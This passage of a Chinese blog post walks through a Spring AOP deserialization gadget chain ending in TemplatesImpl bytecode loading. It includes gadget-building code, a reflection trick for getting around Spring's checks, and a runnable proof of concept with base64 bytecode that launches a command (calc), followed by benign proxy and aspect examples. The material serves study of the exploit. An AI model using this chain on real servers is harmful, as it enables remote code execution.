class="title class_">AopContext</span>.<span class="title function_">setCurrentProxy</span>(proxy);</span><br><span class="line">            setProxyContext = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        target = targetSource.<span class="title function_">getTarget</span>();</span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; targetClass = target != <span class="literal">null</span> ? target.<span class="title function_">getClass</span>() : <span class="literal">null</span>;</span><br><span class="line">        <span class="title class_">List</span>&lt;<span class="title class_">Object</span>&gt; chain = <span class="variable language_">this</span>.<span class="property">advised</span>.<span class="title function_">getInterceptorsAndDynamicInterceptionAdvice</span>(method, targetClass);</span><br><span class="line">        <span class="title class_">Object</span> retVal;</span><br><span class="line">        <span class="keyword">if</span> (chain.<span class="title function_">isEmpty</span>()) &#123;</span><br><span class="line">            <span class="title class_">Object</span>[] argsToUse = <span class="title class_">AopProxyUtils</span>.<span class="title function_">adaptArgumentsIfNecessary</span>(method, args);</span><br><span class="line">            retVal = <span class="title class_">AopUtils</span>.<span class="title function_">invokeJoinpointUsingReflection</span>(target, method, argsToUse);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title class_">MethodInvocation</span> invocation = <span class="keyword">new</span> <span class="title class_">ReflectiveMethodInvocation</span>(proxy, target, method, args, targetClass, chain);</span><br><span class="line">            retVal = invocation.<span class="title function_">proceed</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; returnType = method.<span class="title function_">getReturnType</span>();</span><br><span class="line">        <span class="keyword">if</span> (retVal != <span class="literal">null</span> &amp;&amp; retVal == target &amp;&amp; returnType != <span class="title class_">Object</span>.<span class="property">class</span> &amp;&amp; returnType.<span class="title function_">isInstance</span>(proxy) &amp;&amp; !<span class="title class_">RawTargetAccess</span>.<span class="property">class</span>.<span class="title function_">isAssignableFrom</span>(method.<span class="title function_">getDeclaringClass</span>())) &#123;</span><br><span class="line">            retVal = proxy;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (retVal == <span class="literal">null</span> &amp;&amp; returnType != <span class="title class_">Void</span>.<span class="property">TYPE</span> &amp;&amp; returnType.<span class="title function_">isPrimitive</span>()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AopInvocationException</span>(<span class="string">&quot;Null return value from advice does not match primitive return type for: &quot;</span> + method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Object</span> var12 = retVal;</span><br><span class="line">        <span class="keyword">return</span> var12;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们发现拦截器链如果不为空就会执行拦截器链里的拦截器写的逻辑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chain.<span class="title function_">isEmpty</span>()) &#123;</span><br><span class="line">            <span class="title class_">Object</span>[] argsToUse = <span class="title class_">AopProxyUtils</span>.<span class="title function_">adaptArgumentsIfNecessary</span>(method, args);</span><br><span class="line">            retVal = <span class="title class_">AopUtils</span>.<span class="title function_">invokeJoinpointUsingReflection</span>(target, method, argsToUse);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title class_">MethodInvocation</span> invocation = <span class="keyword">new</span> <span class="title class_">ReflectiveMethodInvocation</span>(proxy, target, method, args, targetClass, chain);</span><br><span class="line">            retVal = invocation.<span class="title function_">proceed</span>();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>扯了这么多把上面的内容</p><p>接下来再重新总结一下这段代码的作用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">InvocationHandler</span> jdkDynamicAopProxy2 = (<span class="title class_">InvocationHandler</span>) <span class="title class_">JdkDynamicAopProxyNode</span>.<span class="title function_">makeGadget</span>(<span class="string">&quot;ape1ron&quot;</span>,advisedSupport);</span><br><span class="line"><span class="title class_">Object</span> proxy2 = <span class="title class_">Proxy</span>.<span class="title function_">makeGadget</span>(jdkDynamicAopProxy2, <span class="title class_">Map</span>.<span class="property">class</span>);</span><br><span class="line"><span class="title class_">Object</span> badAttrValExe = <span class="title class_">BadAttrValExeNode</span>.<span class="title function_">makeGadget</span>(proxy2);</span><br></pre></td></tr></table></figure><p>这段代码创建了一个代理。这个代理的目标对象是一个ape1ron的字符串。在执行这个目标对象的函数之前会先执行拦截器链的代码。所以这里的字符串是什么都无所谓。因为我们是通过拦截器链进行恶意逻辑触发的。</p><p>创建同时实现Spring AOP代理接口和Map接口的代理对象。proxy2.tostring()-&gt;jdkDynamicAopProxy2.tostring()-&gt;advisedSupport-&gt;”ape1ron”.tostring()。但是在tostring之前会先执行拦截器链里的代码</p><p>接下来开始分析advisedSupport这个拦截器链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Advisor</span> <span class="variable">advisor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultIntroductionAdvisor</span>((Advice) proxy1);</span><br><span class="line">List&lt;Advisor&gt; advisors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">advisors.add(advisor);</span><br><span class="line"><span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">Reflections.setFieldValue(advisedSupport,<span class="string">&quot;advisors&quot;</span>,advisors);</span><br><span class="line"><span class="type">DefaultAdvisorChainFactory</span> <span class="variable">advisorChainFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultAdvisorChainFactory</span>();</span><br><span class="line">Reflections.setFieldValue(advisedSupport,<span class="string">&quot;advisorChainFactory&quot;</span>,advisorChainFactory)</span><br></pre></td></tr></table></figure><p>把proxy1封装起来变成拦截器</p><p>然后添加一个chain。正常情况下是直接用addadvise()添加拦截器的。但是会受到spring安全检查约束。所以这里是这么写</p><table><thead><tr><th>场景</th><th>直接 addAdvice()</th><th>通过 Advisor + 反射注入</th></tr></thead><tbody><tr><td>用途</td><td>添加简单的方法拦截逻辑</td><td>动态引入接口或精细控制拦截范围</td></tr><tr><td>安全校验</td><td>受 Spring 安全检查约束</td><td>绕过安全检查，直接操作底层字段</td></tr><tr><td>灵活性</td><td>只能添加通用的 Advice</td><td>可注入任意 Advisor（包括恶意实现）</td></tr><tr><td>典型场景</td><td>正常业务逻辑（如日志、事务）</td><td>漏洞利用（如反序列化攻击、内存马注入）</td></tr></tbody></table><p><strong>DefaultAdvisorChainFactory</strong> 是 Spring AOP 中的一个工厂类，用于根据 AdvisedSupport 中配置的 Advisor 列表和目标方法，构造出一个有序的拦截器链。</p><p>这样，AdvisedSupport 不仅知道有哪些 Advisor，还知道如何将它们按正确顺序组装成拦截器链。</p><p>ok接下来只剩下proxy1需要分析了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AspectJAroundAdvice</span> <span class="variable">aspectJAroundAdvice</span> <span class="operator">=</span> getAspectJAroundAdvice(cmd);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">jdkDynamicAopProxy1</span> <span class="operator">=</span> (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(aspectJAroundAdvice);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxy1</span> <span class="operator">=</span> Proxy.makeGadget(jdkDynamicAopProxy1, Advisor.class, MethodInterceptor.class);</span><br></pre></td></tr></table></figure><p>我们可以发现proxy1是一个jdkDynamicAopProxy1的基础上同时又接入了Advisor, MethodInterceptor这两个接口的</p><p>一个实例</p><p>jdkDynamicAopProxy1是一个代理对象。拦截器链是空的。直达对象aspectJAroundAdvice</p><p>最后就是分析第一行这个函数了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> AspectJAroundAdvice <span class="title function_">getAspectJAroundAdvice</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> TemplatesImplNode.makeGadget(cmd);</span><br><span class="line">        <span class="type">SingletonAspectInstanceFactory</span> <span class="variable">singletonAspectInstanceFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingletonAspectInstanceFactory</span>(templatesImpl);</span><br><span class="line">        <span class="type">AspectJAroundAdvice</span> <span class="variable">aspectJAroundAdvice</span> <span class="operator">=</span> Reflections.newInstanceWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;aspectInstanceFactory&quot;</span>,singletonAspectInstanceFactory);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;declaringClass&quot;</span>, TemplatesImpl.class);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;parameterTypes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//        Method targetMethod = Reflections.getMethod(TemplatesImpl.class,&quot;newTransformer&quot;,new Class[0]);</span></span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(aspectJAroundAdvice,&quot;aspectJAdviceMethod&quot;,targetMethod);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AspectJExpressionPointcut</span> <span class="variable">aspectJExpressionPointcut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AspectJExpressionPointcut</span>();</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;pointcut&quot;</span>,aspectJExpressionPointcut);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;joinPointArgumentIndex&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;joinPointStaticPartArgumentIndex&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> aspectJAroundAdvice;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/CVE-Lemon/p/18402114">https://www.cnblogs.com/CVE-Lemon/p/18402114</a></p><p>简单讲一下TemplatesImplNode。详细可以看上面的文章讲的很好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() --&gt;                        <span class="keyword">public</span></span><br><span class="line">TemplatesImpl#getTransletInstance() --&gt;                <span class="keyword">private</span></span><br><span class="line">TemplatesImpl#defineTransletClasses() --&gt;        <span class="keyword">private</span></span><br><span class="line">TransletClassLoader#defineClass()                        <span class="keyword">default</span></span><br></pre></td></tr></table></figure><p>核心通过defineClass加载恶意的字节码实现危害也就是任意代码的执行。</p><p>直接看完整的poc也是很好理解的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LearnTemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytecode = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBABtMZWFyblRlbXBsYXRlSW1wbEJ5dGVzLmphdmEMAA4ADwcAHAwAHQAeAQAEY2FsYwwAHwAgAQAWTGVhcm5UZW1wbGF0ZUltcGxCeXRlcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADQALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABEACwAAAAQAAQAMAAEADgAPAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAEwAEABQADQAVAAsAAAAEAAEAEAABABEAAAACABI=&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;随便&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来看aspectJAroundAdvice这段代码</p><p>下面这段请仔细看注解。写好了详细的意思。如果不懂什么是切点表达式可以搜一下aspectJAroundAdvice的常见用法和简单案例就可以看懂。我也备好了。在下面的简单案例2和简单案例3</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">AspectJAroundAdvice aspectJAroundAdvice <span class="operator">=</span> Reflections.newInstanceWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;aspectInstanceFactory&quot;,singletonAspectInstanceFactory);</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;declaringClass&quot;, TemplatesImpl.class);</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;methodName&quot;, &quot;newTransformer&quot;);</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;parameterTypes&quot;, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>上面这段代码解释：</span><br><span class="line">创建一个单例切面工厂，将切面实例绑定到 templatesImpl</span><br><span class="line">当 Spring AOP 执行切面逻辑时，会通过 SingletonAspectInstanceFactory.getAspectInstance() 获取切面实例。</span><br><span class="line">由于工厂绑定的是 templatesImpl，因此实际返回的切面实例就是 templatesImpl。</span><br><span class="line">绕过构造函数直接实例化 AspectJAroundAdvice 对象（避免依赖注入校验）</span><br><span class="line">指定拦截方法为 newTransformer（关键触发点）</span><br><span class="line">AspectJExpressionPointcut aspectJExpressionPointcut <span class="operator">=</span> <span class="keyword">new</span> AspectJExpressionPointcut();</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;pointcut&quot;,aspectJExpressionPointcut);</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;joinPointArgumentIndex&quot;,<span class="number">-1</span>);</span><br><span class="line">Reflections.setFieldValue(aspectJAroundAdvice,&quot;joinPointStaticPartArgumentIndex&quot;,<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">return</span> aspectJAroundAdvice;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>上面这段代码解释：</span><br><span class="line">设置方法参数类型为空（匹配无参方法）</span><br><span class="line">未设置切点表达式（如 execution(...)），导致默认匹配所有方法。</span><br><span class="line">避免处理 JoinPoint 参数，简化攻击逻辑，防止因参数不匹配导致异常。</span><br></pre></td></tr></table></figure><p>所以通过未设置切点表达式导致默认匹配所有方法。当任意一个方法被调用的时候就会被拦截并且转到切面实例里的指定的newTransformer拦截方法</p><p>然后实现上面所说的利用链</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() <span class="comment">--&gt;                        public</span></span><br><span class="line">TemplatesImpl#getTransletInstance() <span class="comment">--&gt;                private</span></span><br><span class="line">TemplatesImpl#defineTransletClasses() <span class="comment">--&gt;        private</span></span><br><span class="line">TransletClassLoader#defineClass()                        <span class="keyword">default</span></span><br></pre></td></tr></table></figure><h3 id="简单案例1："><a href="#简单案例1：" class="headerlink" title="简单案例1："></a>简单案例1：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 定义业务接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">BusinessService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">executeTask</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 业务实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BusinessServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">BusinessService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeTask</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Business logic is executed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 定义拦截器（InvocationHandler）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoggingInterceptor</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoggingInterceptor</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 在方法调用之前做一些额外的事情（例如打印日志）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Method &quot;</span> + method.getName() + <span class="string">&quot; is about to be called.&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用实际的业务方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 在方法调用之后做一些额外的事情（例如打印日志）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Method &quot;</span> + method.getName() + <span class="string">&quot; has been called.&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 测试代理</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 目标对象</span></span><br><span class="line">        <span class="type">BusinessService</span> <span class="variable">businessService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BusinessServiceImpl</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个代理对象</span></span><br><span class="line">        <span class="type">BusinessService</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (BusinessService) Proxy.newProxyInstance(</span><br><span class="line">                BusinessService.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;BusinessService.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">LoggingInterceptor</span>(businessService) <span class="comment">// 拦截器</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用代理对象的方法，拦截器会拦截并打印日志</span></span><br><span class="line">        proxyInstance.executeTask();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="简单案例2："><a href="#简单案例2：" class="headerlink" title="简单案例2："></a>简单案例2：</h3><p>下面给出一个简单的例子，展示如何使用 Spring AOP 定义一个切面，从而在目标方法执行前后插入额外逻辑（例如日志记录）。</p><ol><li>定义目标类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createUser</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;UserService: 正在创建用户 &quot;</span> + username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteUser</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;UserService: 正在删除用户 &quot;</span> + username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>定义切面类</li></ol><p>在这个切面中，我们用 Spring AOP 的注解定义前置通知和后置通知。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Aspect;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Before;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.After;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.JoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="meta">@Aspect</span>  <span class="comment">// 表示这个类是一个切面</span></span><br><span class="line"><span class="meta">@Component</span>  <span class="comment">// 让 Spring 容器管理它</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoggingAspect</span> &#123;</span><br><span class="line">    <span class="comment">// 前置通知：在 UserService.createUser() 方法执行前调用</span></span><br><span class="line">    <span class="meta">@Before(&quot;execution(* UserService.createUser(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">beforeCreateUser</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;LoggingAspect: 在调用 &quot;</span> + joinPoint.getSignature().getName() + <span class="string">&quot; 方法前记录日志。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 后置通知：在 UserService.createUser() 方法执行后调用</span></span><br><span class="line">    <span class="meta">@After(&quot;execution(* UserService.createUser(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCreateUser</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;LoggingAspect: 在调用 &quot;</span> + joinPoint.getSignature().getName() + <span class="string">&quot; 方法后记录日志。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 